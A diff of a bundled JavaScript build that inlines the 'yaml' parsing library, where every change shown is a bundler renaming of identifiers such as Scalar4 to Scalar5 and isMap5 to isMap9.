@@ -58,12 +58,12 @@ var require_identity = __commonJS({
     var SCALAR = /* @__PURE__ */ Symbol.for("yaml.scalar");
     var SEQ = /* @__PURE__ */ Symbol.for("yaml.seq");
     var NODE_TYPE = /* @__PURE__ */ Symbol.for("yaml.node.type");
-    var isAlias4 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === ALIAS;
+    var isAlias5 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === ALIAS;
     var isDocument = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === DOC;
-    var isMap5 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === MAP;
-    var isPair3 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === PAIR;
-    var isScalar7 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === SCALAR;
-    var isSeq4 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === SEQ;
+    var isMap9 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === MAP;
+    var isPair5 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === PAIR;
+    var isScalar11 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === SCALAR;
+    var isSeq6 = (node) => !!node && typeof node === "object" && node[NODE_TYPE] === SEQ;
     function isCollection(node) {
       if (node && typeof node === "object")
         switch (node[NODE_TYPE]) {
@@ -84,7 +84,7 @@ var require_identity = __commonJS({
         }
       return false;
     }
-    var hasAnchor = (node) => (isScalar7(node) || isCollection(node)) && !!node.anchor;
+    var hasAnchor = (node) => (isScalar11(node) || isCollection(node)) && !!node.anchor;
     exports.ALIAS = ALIAS;
     exports.DOC = DOC;
     exports.MAP = MAP;
@@ -93,14 +93,14 @@ var require_identity = __commonJS({
     exports.SCALAR = SCALAR;
     exports.SEQ = SEQ;
     exports.hasAnchor = hasAnchor;
-    exports.isAlias = isAlias4;
+    exports.isAlias = isAlias5;
     exports.isCollection = isCollection;
     exports.isDocument = isDocument;
-    exports.isMap = isMap5;
+    exports.isMap = isMap9;
     exports.isNode = isNode;
-    exports.isPair = isPair3;
-    exports.isScalar = isScalar7;
-    exports.isSeq = isSeq4;
+    exports.isPair = isPair5;
+    exports.isScalar = isScalar11;
+    exports.isSeq = isSeq6;
   }
 });
 
@@ -110,7 +110,7 @@ var require_visit = __commonJS({
     "use strict";
     var identity3 = require_identity();
     var BREAK = /* @__PURE__ */ Symbol("break visit");
-    var SKIP = /* @__PURE__ */ Symbol("skip children");
+    var SKIP2 = /* @__PURE__ */ Symbol("skip children");
     var REMOVE = /* @__PURE__ */ Symbol("remove node");
     function visit3(node, visitor) {
       const visitor_ = initVisitor(visitor);
@@ -122,7 +122,7 @@ var require_visit = __commonJS({
         visit_(null, node, visitor_, Object.freeze([]));
     }
     visit3.BREAK = BREAK;
-    visit3.SKIP = SKIP;
+    visit3.SKIP = SKIP2;
     visit3.REMOVE = REMOVE;
     function visit_(key2, node, visitor, path) {
       const ctrl = callVisitor(key2, node, visitor, path);
@@ -170,7 +170,7 @@ var require_visit = __commonJS({
         await visitAsync_(null, node, visitor_, Object.freeze([]));
     }
     visitAsync.BREAK = BREAK;
-    visitAsync.SKIP = SKIP;
+    visitAsync.SKIP = SKIP2;
     visitAsync.REMOVE = REMOVE;
     async function visitAsync_(key2, node, visitor, path) {
       const ctrl = await callVisitor(key2, node, visitor, path);
@@ -750,7 +750,7 @@ var require_Scalar = __commonJS({
     var Node = require_Node();
     var toJS2 = require_toJS();
     var isScalarValue = (value2) => !value2 || typeof value2 !== "function" && typeof value2 !== "object";
-    var Scalar4 = class extends Node.NodeBase {
+    var Scalar5 = class extends Node.NodeBase {
       constructor(value2) {
         super(identity3.SCALAR);
         this.value = value2;
@@ -762,12 +762,12 @@ var require_Scalar = __commonJS({
         return String(this.value);
       }
     };
-    Scalar4.BLOCK_FOLDED = "BLOCK_FOLDED";
-    Scalar4.BLOCK_LITERAL = "BLOCK_LITERAL";
-    Scalar4.PLAIN = "PLAIN";
-    Scalar4.QUOTE_DOUBLE = "QUOTE_DOUBLE";
-    Scalar4.QUOTE_SINGLE = "QUOTE_SINGLE";
-    exports.Scalar = Scalar4;
+    Scalar5.BLOCK_FOLDED = "BLOCK_FOLDED";
+    Scalar5.BLOCK_LITERAL = "BLOCK_LITERAL";
+    Scalar5.PLAIN = "PLAIN";
+    Scalar5.QUOTE_DOUBLE = "QUOTE_DOUBLE";
+    Scalar5.QUOTE_SINGLE = "QUOTE_SINGLE";
+    exports.Scalar = Scalar5;
     exports.isScalarValue = isScalarValue;
   }
 });
@@ -778,7 +778,7 @@ var require_createNode = __commonJS({
     "use strict";
     var Alias = require_Alias();
     var identity3 = require_identity();
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     var defaultTagPrefix = "tag:yaml.org,2002:";
     function findTagObject(value2, tagName, tags) {
       if (tagName) {
@@ -823,7 +823,7 @@ var require_createNode = __commonJS({
           value2 = value2.toJSON();
         }
         if (!value2 || typeof value2 !== "object") {
-          const node2 = new Scalar4.Scalar(value2);
+          const node2 = new Scalar5.Scalar(value2);
           if (ref)
             ref.node = node2;
           return node2;
@@ -834,7 +834,7 @@ var require_createNode = __commonJS({
         onTagObj(tagObj);
         delete ctx.onTagObj;
       }
-      const node = tagObj?.createNode ? tagObj.createNode(ctx.schema, value2, ctx) : typeof tagObj?.nodeClass?.from === "function" ? tagObj.nodeClass.from(ctx.schema, value2, ctx) : new Scalar4.Scalar(value2);
+      const node = tagObj?.createNode ? tagObj.createNode(ctx.schema, value2, ctx) : typeof tagObj?.nodeClass?.from === "function" ? tagObj.nodeClass.from(ctx.schema, value2, ctx) : new Scalar5.Scalar(value2);
       if (tagName)
         node.tag = tagName;
       else if (!tagObj.default)
@@ -1147,7 +1147,7 @@ ${indent}${text4.slice(fold + 1, end2)}`;
 var require_stringifyString = __commonJS({
   "node_modules/yaml/dist/stringify/stringifyString.js"(exports) {
     "use strict";
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     var foldFlowLines = require_foldFlowLines();
     var getFoldOptions = (ctx, isBlock) => ({
       indentAtStart: isBlock ? ctx.indent.length : ctx.indentAtStart,
@@ -1290,7 +1290,7 @@ ${indent}`) + "'";
         return quotedString(value2, ctx);
       }
       const indent = ctx.indent || (ctx.forceBlockIndent || containsDocumentMarker(value2) ? "  " : "");
-      const literal2 = blockQuote === "literal" ? true : blockQuote === "folded" || type === Scalar4.Scalar.BLOCK_FOLDED ? false : type === Scalar4.Scalar.BLOCK_LITERAL ? true : !lineLengthOverLimit(value2, lineWidth, indent.length);
+      const literal2 = blockQuote === "literal" ? true : blockQuote === "folded" || type === Scalar5.Scalar.BLOCK_FOLDED ? false : type === Scalar5.Scalar.BLOCK_LITERAL ? true : !lineLengthOverLimit(value2, lineWidth, indent.length);
       if (!value2)
         return literal2 ? "|\n" : ">\n";
       let chomp;
@@ -1345,7 +1345,7 @@ ${indent}`) + "'";
         const foldedValue = value2.replace(/\n+/g, "\n$&").replace(/(?:^|\n)([\t ].*)(?:([\n\t ]*)\n(?![\n\t ]))?/g, "$1$2").replace(/\n+/g, `$&${indent}`);
         let literalFallback = false;
         const foldOptions = getFoldOptions(ctx, true);
-        if (blockQuote !== "folded" && type !== Scalar4.Scalar.BLOCK_FOLDED) {
+        if (blockQuote !== "folded" && type !== Scalar5.Scalar.BLOCK_FOLDED) {
           foldOptions.onOverflow = () => {
             literalFallback = true;
           };
@@ -1368,7 +1368,7 @@ ${indent}${start2}${value2}${end}`;
       if (/^[\n\t ,[\]{}#&*!|>'"%@`]|^[?-]$|^[?-][ \t]|[\n:][ \t]|[ \t]\n|[\n\t ]#|[\n\t :]$/.test(value2)) {
         return implicitKey || inFlow || !value2.includes("\n") ? quotedString(value2, ctx) : blockString(item, ctx, onComment, onChompKeep);
       }
-      if (!implicitKey && !inFlow && type !== Scalar4.Scalar.PLAIN && value2.includes("\n")) {
+      if (!implicitKey && !inFlow && type !== Scalar5.Scalar.PLAIN && value2.includes("\n")) {
         return blockString(item, ctx, onComment, onChompKeep);
       }
       if (containsDocumentMarker(value2)) {
@@ -1393,20 +1393,20 @@ ${indent}`);
       const { implicitKey, inFlow } = ctx;
       const ss = typeof item.value === "string" ? item : Object.assign({}, item, { value: String(item.value) });
       let { type } = item;
-      if (type !== Scalar4.Scalar.QUOTE_DOUBLE) {
+      if (type !== Scalar5.Scalar.QUOTE_DOUBLE) {
         if (/[\x00-\x08\x0b-\x1f\x7f-\x9f\u{D800}-\u{DFFF}]/u.test(ss.value))
-          type = Scalar4.Scalar.QUOTE_DOUBLE;
+          type = Scalar5.Scalar.QUOTE_DOUBLE;
       }
       const _stringify = (_type) => {
         switch (_type) {
-          case Scalar4.Scalar.BLOCK_FOLDED:
-          case Scalar4.Scalar.BLOCK_LITERAL:
+          case Scalar5.Scalar.BLOCK_FOLDED:
+          case Scalar5.Scalar.BLOCK_LITERAL:
             return implicitKey || inFlow ? quotedString(ss.value, ctx) : blockString(ss, ctx, onComment, onChompKeep);
-          case Scalar4.Scalar.QUOTE_DOUBLE:
+          case Scalar5.Scalar.QUOTE_DOUBLE:
             return doubleQuotedString(ss.value, ctx);
-          case Scalar4.Scalar.QUOTE_SINGLE:
+          case Scalar5.Scalar.QUOTE_SINGLE:
             return singleQuotedString(ss.value, ctx);
-          case Scalar4.Scalar.PLAIN:
+          case Scalar5.Scalar.PLAIN:
             return plainString(ss, ctx, onComment, onChompKeep);
           default:
             return null;
@@ -1555,7 +1555,7 @@ var require_stringifyPair = __commonJS({
   "node_modules/yaml/dist/stringify/stringifyPair.js"(exports) {
     "use strict";
     var identity3 = require_identity();
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     var stringify4 = require_stringify();
     var stringifyComment = require_stringifyComment();
     function stringifyPair({ key: key2, value: value2 }, ctx, onComment, onChompKeep) {
@@ -1570,7 +1570,7 @@ var require_stringifyPair = __commonJS({
           throw new Error(msg);
         }
       }
-      let explicitKey = !simpleKeys && (!key2 || keyComment && value2 == null && !ctx.inFlow || identity3.isCollection(key2) || (identity3.isScalar(key2) ? key2.type === Scalar4.Scalar.BLOCK_FOLDED || key2.type === Scalar4.Scalar.BLOCK_LITERAL : typeof key2 === "object"));
+      let explicitKey = !simpleKeys && (!key2 || keyComment && value2 == null && !ctx.inFlow || identity3.isCollection(key2) || (identity3.isScalar(key2) ? key2.type === Scalar5.Scalar.BLOCK_FOLDED || key2.type === Scalar5.Scalar.BLOCK_LITERAL : typeof key2 === "object"));
       ctx = Object.assign({}, ctx, {
         allNullValues: false,
         implicitKey: !explicitKey && (simpleKeys || !allNullValues),
@@ -1710,19 +1710,19 @@ var require_merge = __commonJS({
   "node_modules/yaml/dist/schema/yaml-1.1/merge.js"(exports) {
     "use strict";
     var identity3 = require_identity();
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     var MERGE_KEY = "<<";
     var merge3 = {
       identify: (value2) => value2 === MERGE_KEY || typeof value2 === "symbol" && value2.description === MERGE_KEY,
       default: "key",
       tag: "tag:yaml.org,2002:merge",
       test: /^<<$/,
-      resolve: () => Object.assign(new Scalar4.Scalar(Symbol(MERGE_KEY)), {
+      resolve: () => Object.assign(new Scalar5.Scalar(Symbol(MERGE_KEY)), {
         addToJSMap: addMergeToJSMap
       }),
       stringify: () => MERGE_KEY
     };
-    var isMergeKey2 = (ctx, key2) => (merge3.identify(key2) || identity3.isScalar(key2) && (!key2.type || key2.type === Scalar4.Scalar.PLAIN) && merge3.identify(key2.value)) && ctx?.doc.schema.tags.some((tag) => tag.tag === merge3.tag && tag.default);
+    var isMergeKey2 = (ctx, key2) => (merge3.identify(key2) || identity3.isScalar(key2) && (!key2.type || key2.type === Scalar5.Scalar.PLAIN) && merge3.identify(key2.value)) && ctx?.doc.schema.tags.some((tag) => tag.tag === merge3.tag && tag.default);
     function addMergeToJSMap(ctx, map, value2) {
       const source = resolveAliasValue(ctx, value2);
       if (identity3.isSeq(source))
@@ -2029,7 +2029,7 @@ var require_YAMLMap = __commonJS({
     var Collection = require_Collection();
     var identity3 = require_identity();
     var Pair = require_Pair();
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     function findPair(items2, key2) {
       const k = identity3.isScalar(key2) ? key2.value : key2;
       for (const it of items2) {
@@ -2096,7 +2096,7 @@ var require_YAMLMap = __commonJS({
         if (prev) {
           if (!overwrite)
             throw new Error(`Key ${_pair.key} already set`);
-          if (identity3.isScalar(prev.value) && Scalar4.isScalarValue(_pair.value))
+          if (identity3.isScalar(prev.value) && Scalar5.isScalarValue(_pair.value))
             prev.value.value = _pair.value;
           else
             prev.value = _pair.value;
@@ -2194,7 +2194,7 @@ var require_YAMLSeq = __commonJS({
     var stringifyCollection = require_stringifyCollection();
     var Collection = require_Collection();
     var identity3 = require_identity();
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     var toJS2 = require_toJS();
     var YAMLSeq = class extends Collection.Collection {
       static get tagName() {
@@ -2251,7 +2251,7 @@ var require_YAMLSeq = __commonJS({
         if (typeof idx !== "number")
           throw new Error(`Expected a valid index, not ${key2}.`);
         const prev = this.items[idx];
-        if (identity3.isScalar(prev) && Scalar4.isScalarValue(value2))
+        if (identity3.isScalar(prev) && Scalar5.isScalarValue(value2))
           prev.value = value2;
         else
           this.items[idx] = value2;
@@ -2347,14 +2347,14 @@ var require_string = __commonJS({
 var require_null = __commonJS({
   "node_modules/yaml/dist/schema/common/null.js"(exports) {
     "use strict";
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     var nullTag = {
       identify: (value2) => value2 == null,
-      createNode: () => new Scalar4.Scalar(null),
+      createNode: () => new Scalar5.Scalar(null),
       default: true,
       tag: "tag:yaml.org,2002:null",
       test: /^(?:~|[Nn]ull|NULL)?$/,
-      resolve: () => new Scalar4.Scalar(null),
+      resolve: () => new Scalar5.Scalar(null),
       stringify: ({ source }, ctx) => typeof source === "string" && nullTag.test.test(source) ? source : ctx.options.nullStr
     };
     exports.nullTag = nullTag;
@@ -2365,13 +2365,13 @@ var require_null = __commonJS({
 var require_bool = __commonJS({
   "node_modules/yaml/dist/schema/core/bool.js"(exports) {
     "use strict";
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     var boolTag = {
       identify: (value2) => typeof value2 === "boolean",
       default: true,
       tag: "tag:yaml.org,2002:bool",
       test: /^(?:[Tt]rue|TRUE|[Ff]alse|FALSE)$/,
-      resolve: (str) => new Scalar4.Scalar(str[0] === "t" || str[0] === "T"),
+      resolve: (str) => new Scalar5.Scalar(str[0] === "t" || str[0] === "T"),
       stringify({ source, value: value2 }, ctx) {
         if (source && boolTag.test.test(source)) {
           const sv = source[0] === "t" || source[0] === "T";
@@ -2416,7 +2416,7 @@ var require_stringifyNumber = __commonJS({
 var require_float = __commonJS({
   "node_modules/yaml/dist/schema/core/float.js"(exports) {
     "use strict";
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     var stringifyNumber = require_stringifyNumber();
     var floatNaN = {
       identify: (value2) => typeof value2 === "number",
@@ -2444,7 +2444,7 @@ var require_float = __commonJS({
       tag: "tag:yaml.org,2002:float",
       test: /^[-+]?(?:\.[0-9]+|[0-9]+\.[0-9]*)$/,
       resolve(str) {
-        const node = new Scalar4.Scalar(parseFloat(str));
+        const node = new Scalar5.Scalar(parseFloat(str));
         const dot = str.indexOf(".");
         if (dot !== -1 && str[str.length - 1] === "0")
           node.minFractionDigits = str.length - dot - 1;
@@ -2535,7 +2535,7 @@ var require_schema = __commonJS({
 var require_schema2 = __commonJS({
   "node_modules/yaml/dist/schema/json/schema.js"(exports) {
     "use strict";
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     var map = require_map();
     var seq = require_seq();
     function intIdentify(value2) {
@@ -2552,7 +2552,7 @@ var require_schema2 = __commonJS({
       },
       {
         identify: (value2) => value2 == null,
-        createNode: () => new Scalar4.Scalar(null),
+        createNode: () => new Scalar5.Scalar(null),
         default: true,
         tag: "tag:yaml.org,2002:null",
         test: /^null$/,
@@ -2603,7 +2603,7 @@ var require_binary = __commonJS({
   "node_modules/yaml/dist/schema/yaml-1.1/binary.js"(exports) {
     "use strict";
     var node_buffer = __require("buffer");
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     var stringifyString = require_stringifyString();
     var binary = {
       identify: (value2) => value2 instanceof Uint8Array,
@@ -2647,15 +2647,15 @@ var require_binary = __commonJS({
         } else {
           throw new Error("This environment does not support writing binary tags; either Buffer or btoa is required");
         }
-        type ?? (type = Scalar4.Scalar.BLOCK_LITERAL);
-        if (type !== Scalar4.Scalar.QUOTE_DOUBLE) {
+        type ?? (type = Scalar5.Scalar.BLOCK_LITERAL);
+        if (type !== Scalar5.Scalar.QUOTE_DOUBLE) {
           const lineWidth = Math.max(ctx.options.lineWidth - ctx.indent.length, ctx.options.minContentWidth);
           const n = Math.ceil(str.length / lineWidth);
           const lines = new Array(n);
           for (let i = 0, o = 0; i < n; ++i, o += lineWidth) {
             lines[i] = str.substr(o, lineWidth);
           }
-          str = lines.join(type === Scalar4.Scalar.BLOCK_LITERAL ? "\n" : " ");
+          str = lines.join(type === Scalar5.Scalar.BLOCK_LITERAL ? "\n" : " ");
         }
         return stringifyString.stringifyString({ comment, type, value: str }, ctx, onComment, onChompKeep);
       }
@@ -2670,7 +2670,7 @@ var require_pairs = __commonJS({
     "use strict";
     var identity3 = require_identity();
     var Pair = require_Pair();
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     var YAMLSeq = require_YAMLSeq();
     function resolvePairs(seq, onError) {
       if (identity3.isSeq(seq)) {
@@ -2681,7 +2681,7 @@ var require_pairs = __commonJS({
           else if (identity3.isMap(item)) {
             if (item.items.length > 1)
               onError("Each pair must have its own sequence indicator");
-            const pair = item.items[0] || new Pair.Pair(new Scalar4.Scalar(null));
+            const pair = item.items[0] || new Pair.Pair(new Scalar5.Scalar(null));
             if (item.commentBefore)
               pair.key.commentBefore = pair.key.commentBefore ? `${item.commentBefore}
 ${pair.key.commentBefore}` : item.commentBefore;
@@ -2824,7 +2824,7 @@ var require_omap = __commonJS({
 var require_bool2 = __commonJS({
   "node_modules/yaml/dist/schema/yaml-1.1/bool.js"(exports) {
     "use strict";
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     function boolStringify({ value: value2, source }, ctx) {
       const boolObj = value2 ? trueTag : falseTag;
       if (source && boolObj.test.test(source))
@@ -2836,7 +2836,7 @@ var require_bool2 = __commonJS({
       default: true,
       tag: "tag:yaml.org,2002:bool",
       test: /^(?:Y|y|[Yy]es|YES|[Tt]rue|TRUE|[Oo]n|ON)$/,
-      resolve: () => new Scalar4.Scalar(true),
+      resolve: () => new Scalar5.Scalar(true),
       stringify: boolStringify
     };
     var falseTag = {
@@ -2844,7 +2844,7 @@ var require_bool2 = __commonJS({
       default: true,
       tag: "tag:yaml.org,2002:bool",
       test: /^(?:N|n|[Nn]o|NO|[Ff]alse|FALSE|[Oo]ff|OFF)$/,
-      resolve: () => new Scalar4.Scalar(false),
+      resolve: () => new Scalar5.Scalar(false),
       stringify: boolStringify
     };
     exports.falseTag = falseTag;
@@ -2856,7 +2856,7 @@ var require_bool2 = __commonJS({
 var require_float2 = __commonJS({
   "node_modules/yaml/dist/schema/yaml-1.1/float.js"(exports) {
     "use strict";
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     var stringifyNumber = require_stringifyNumber();
     var floatNaN = {
       identify: (value2) => typeof value2 === "number",
@@ -2884,7 +2884,7 @@ var require_float2 = __commonJS({
       tag: "tag:yaml.org,2002:float",
       test: /^[-+]?(?:[0-9][0-9_]*)?\.[0-9_]*$/,
       resolve(str) {
-        const node = new Scalar4.Scalar(parseFloat(str.replace(/_/g, "")));
+        const node = new Scalar5.Scalar(parseFloat(str.replace(/_/g, "")));
         const dot = str.indexOf(".");
         if (dot !== -1) {
           const f2 = str.substring(dot + 1).replace(/_/g, "");
@@ -4208,9 +4208,9 @@ var require_resolve_flow_collection = __commonJS({
     var blockMsg = "Block collections are not allowed within flow collections";
     var isBlock = (token) => token && (token.type === "block-map" || token.type === "block-seq");
     function resolveFlowCollection({ composeNode, composeEmptyNode }, ctx, fc, onError, tag) {
-      const isMap5 = fc.start.source === "{";
-      const fcName = isMap5 ? "flow map" : "flow sequence";
-      const NodeClass = tag?.nodeClass ?? (isMap5 ? YAMLMap.YAMLMap : YAMLSeq.YAMLSeq);
+      const isMap9 = fc.start.source === "{";
+      const fcName = isMap9 ? "flow map" : "flow sequence";
+      const NodeClass = tag?.nodeClass ?? (isMap9 ? YAMLMap.YAMLMap : YAMLSeq.YAMLSeq);
       const coll = new NodeClass(ctx.schema);
       coll.flow = true;
       const atRoot = ctx.atRoot;
@@ -4246,7 +4246,7 @@ var require_resolve_flow_collection = __commonJS({
             offset = props.end;
             continue;
           }
-          if (!isMap5 && ctx.options.strict && utilContainsNewline.containsNewline(key2))
+          if (!isMap9 && ctx.options.strict && utilContainsNewline.containsNewline(key2))
             onError(
               key2,
               // checked by containsNewline()
@@ -4286,7 +4286,7 @@ var require_resolve_flow_collection = __commonJS({
             }
           }
         }
-        if (!isMap5 && !sep3 && !props.found) {
+        if (!isMap9 && !sep3 && !props.found) {
           const valueNode = value2 ? composeNode(ctx, value2, props, onError) : composeEmptyNode(ctx, props.end, sep3, null, props, onError);
           coll.items.push(valueNode);
           offset = valueNode.range[2];
@@ -4309,7 +4309,7 @@ var require_resolve_flow_collection = __commonJS({
             startOnNewline: false
           });
           if (valueProps.found) {
-            if (!isMap5 && !props.found && ctx.options.strict) {
+            if (!isMap9 && !props.found && ctx.options.strict) {
               if (sep3)
                 for (const st of sep3) {
                   if (st === valueProps.found)
@@ -4341,7 +4341,7 @@ var require_resolve_flow_collection = __commonJS({
           const pair = new Pair.Pair(keyNode, valueNode);
           if (ctx.options.keepSourceTokens)
             pair.srcToken = collItem;
-          if (isMap5) {
+          if (isMap9) {
             const map = coll;
             if (utilMapIncludes.mapIncludes(ctx, map.items, keyNode))
               onError(keyStart, "DUPLICATE_KEY", "Map keys must be unique");
@@ -4357,7 +4357,7 @@ var require_resolve_flow_collection = __commonJS({
           offset = valueNode ? valueNode.range[2] : valueProps.end;
         }
       }
-      const expectedEnd = isMap5 ? "}" : "]";
+      const expectedEnd = isMap9 ? "}" : "]";
       const [ce, ...ee] = fc.end;
       let cePos = offset;
       if (ce?.source === expectedEnd)
@@ -4392,7 +4392,7 @@ var require_compose_collection = __commonJS({
   "node_modules/yaml/dist/compose/compose-collection.js"(exports) {
     "use strict";
     var identity3 = require_identity();
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     var YAMLMap = require_YAMLMap();
     var YAMLSeq = require_YAMLSeq();
     var resolveBlockMap = require_resolve_block_map();
@@ -4441,7 +4441,7 @@ var require_compose_collection = __commonJS({
       }
       const coll = resolveCollection(CN, ctx, token, onError, tagName, tag);
       const res = tag.resolve?.(coll, (msg) => onError(tagToken, "TAG_RESOLVE_FAILED", msg), ctx.options) ?? coll;
-      const node = identity3.isNode(res) ? res : new Scalar4.Scalar(res);
+      const node = identity3.isNode(res) ? res : new Scalar5.Scalar(res);
       node.range = coll.range;
       node.tag = tagName;
       if (tag?.format)
@@ -4456,13 +4456,13 @@ var require_compose_collection = __commonJS({
 var require_resolve_block_scalar = __commonJS({
   "node_modules/yaml/dist/compose/resolve-block-scalar.js"(exports) {
     "use strict";
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     function resolveBlockScalar(ctx, scalar, onError) {
       const start2 = scalar.offset;
       const header = parseBlockScalarHeader(scalar, ctx.options.strict, onError);
       if (!header)
         return { value: "", type: null, comment: "", range: [start2, start2, start2] };
-      const type = header.mode === ">" ? Scalar4.Scalar.BLOCK_FOLDED : Scalar4.Scalar.BLOCK_LITERAL;
+      const type = header.mode === ">" ? Scalar5.Scalar.BLOCK_FOLDED : Scalar5.Scalar.BLOCK_LITERAL;
       const lines = scalar.source ? splitLines(scalar.source) : [];
       let chompStart = lines.length;
       for (let i = lines.length - 1; i >= 0; --i) {
@@ -4524,7 +4524,7 @@ var require_resolve_block_scalar = __commonJS({
           onError(offset - content.length - (crlf ? 2 : 1), "BAD_INDENT", message);
           indent = "";
         }
-        if (type === Scalar4.Scalar.BLOCK_LITERAL) {
+        if (type === Scalar5.Scalar.BLOCK_LITERAL) {
           value2 += sep3 + indent.slice(trimIndent) + content;
           sep3 = "\n";
         } else if (indent.length > trimIndent || content[0] === "	") {
@@ -4639,7 +4639,7 @@ var require_resolve_block_scalar = __commonJS({
 var require_resolve_flow_scalar = __commonJS({
   "node_modules/yaml/dist/compose/resolve-flow-scalar.js"(exports) {
     "use strict";
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     var resolveEnd = require_resolve_end();
     function resolveFlowScalar(scalar, strict, onError) {
       const { offset, type, source, end } = scalar;
@@ -4648,15 +4648,15 @@ var require_resolve_flow_scalar = __commonJS({
       const _onError = (rel, code2, msg) => onError(offset + rel, code2, msg);
       switch (type) {
         case "scalar":
-          _type = Scalar4.Scalar.PLAIN;
+          _type = Scalar5.Scalar.PLAIN;
           value2 = plainValue(source, _onError);
           break;
         case "single-quoted-scalar":
-          _type = Scalar4.Scalar.QUOTE_SINGLE;
+          _type = Scalar5.Scalar.QUOTE_SINGLE;
           value2 = singleQuotedValue(source, _onError);
           break;
         case "double-quoted-scalar":
-          _type = Scalar4.Scalar.QUOTE_DOUBLE;
+          _type = Scalar5.Scalar.QUOTE_DOUBLE;
           value2 = doubleQuotedValue(source, _onError);
           break;
         /* istanbul ignore next should not happen */
@@ -4861,11 +4861,11 @@ var require_compose_scalar = __commonJS({
   "node_modules/yaml/dist/compose/compose-scalar.js"(exports) {
     "use strict";
     var identity3 = require_identity();
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     var resolveBlockScalar = require_resolve_block_scalar();
     var resolveFlowScalar = require_resolve_flow_scalar();
     function composeScalar(ctx, token, tagToken, onError) {
-      const { value: value2, type, comment, range } = token.type === "block-scalar" ? resolveBlockScalar.resolveBlockScalar(ctx, token, onError) : resolveFlowScalar.resolveFlowScalar(token, ctx.options.strict, onError);
+      const { value: value2, type, comment, range: range2 } = token.type === "block-scalar" ? resolveBlockScalar.resolveBlockScalar(ctx, token, onError) : resolveFlowScalar.resolveFlowScalar(token, ctx.options.strict, onError);
       const tagName = tagToken ? ctx.directives.tagName(tagToken.source, (msg) => onError(tagToken, "TAG_RESOLVE_FAILED", msg)) : null;
       let tag;
       if (ctx.options.stringKeys && ctx.atKey) {
@@ -4879,13 +4879,13 @@ var require_compose_scalar = __commonJS({
       let scalar;
       try {
         const res = tag.resolve(value2, (msg) => onError(tagToken ?? token, "TAG_RESOLVE_FAILED", msg), ctx.options);
-        scalar = identity3.isScalar(res) ? res : new Scalar4.Scalar(res);
+        scalar = identity3.isScalar(res) ? res : new Scalar5.Scalar(res);
       } catch (error2) {
         const msg = error2 instanceof Error ? error2.message : String(error2);
         onError(tagToken ?? token, "TAG_RESOLVE_FAILED", msg);
-        scalar = new Scalar4.Scalar(value2);
+        scalar = new Scalar5.Scalar(value2);
       }
-      scalar.range = range;
+      scalar.range = range2;
       scalar.source = value2;
       if (type)
         scalar.type = type;
@@ -5575,7 +5575,7 @@ var require_cst_visit = __commonJS({
   "node_modules/yaml/dist/parse/cst-visit.js"(exports) {
     "use strict";
     var BREAK = /* @__PURE__ */ Symbol("break visit");
-    var SKIP = /* @__PURE__ */ Symbol("skip children");
+    var SKIP2 = /* @__PURE__ */ Symbol("skip children");
     var REMOVE = /* @__PURE__ */ Symbol("remove item");
     function visit3(cst, visitor) {
       if ("type" in cst && cst.type === "document")
@@ -5583,7 +5583,7 @@ var require_cst_visit = __commonJS({
       _visit(Object.freeze([]), cst, visitor);
     }
     visit3.BREAK = BREAK;
-    visit3.SKIP = SKIP;
+    visit3.SKIP = SKIP2;
     visit3.REMOVE = REMOVE;
     visit3.itemAtPath = (cst, path) => {
       let item = cst;
@@ -5644,7 +5644,7 @@ var require_cst = __commonJS({
     var FLOW_END = "";
     var SCALAR = "";
     var isCollection = (token) => !!token && "items" in token;
-    var isScalar7 = (token) => !!token && (token.type === "scalar" || token.type === "single-quoted-scalar" || token.type === "double-quoted-scalar" || token.type === "block-scalar");
+    var isScalar11 = (token) => !!token && (token.type === "scalar" || token.type === "single-quoted-scalar" || token.type === "double-quoted-scalar" || token.type === "block-scalar");
     function prettyToken(token) {
       switch (token) {
         case BOM:
@@ -5728,7 +5728,7 @@ var require_cst = __commonJS({
     exports.FLOW_END = FLOW_END;
     exports.SCALAR = SCALAR;
     exports.isCollection = isCollection;
-    exports.isScalar = isScalar7;
+    exports.isScalar = isScalar11;
     exports.prettyToken = prettyToken;
     exports.tokenType = tokenType;
   }
@@ -7336,7 +7336,7 @@ var require_dist = __commonJS({
     var Alias = require_Alias();
     var identity3 = require_identity();
     var Pair = require_Pair();
-    var Scalar4 = require_Scalar();
+    var Scalar5 = require_Scalar();
     var YAMLMap = require_YAMLMap();
     var YAMLSeq = require_YAMLSeq();
     var cst = require_cst();
@@ -7361,7 +7361,7 @@ var require_dist = __commonJS({
     exports.isScalar = identity3.isScalar;
     exports.isSeq = identity3.isSeq;
     exports.Pair = Pair.Pair;
-    exports.Scalar = Scalar4.Scalar;
+    exports.Scalar = Scalar5.Scalar;
     exports.YAMLMap = YAMLMap.YAMLMap;
     exports.YAMLSeq = YAMLSeq.YAMLSeq;
     exports.CST = cst;
@@ -7483,12 +7483,12 @@ function snapshotIdentity(snapshot) {
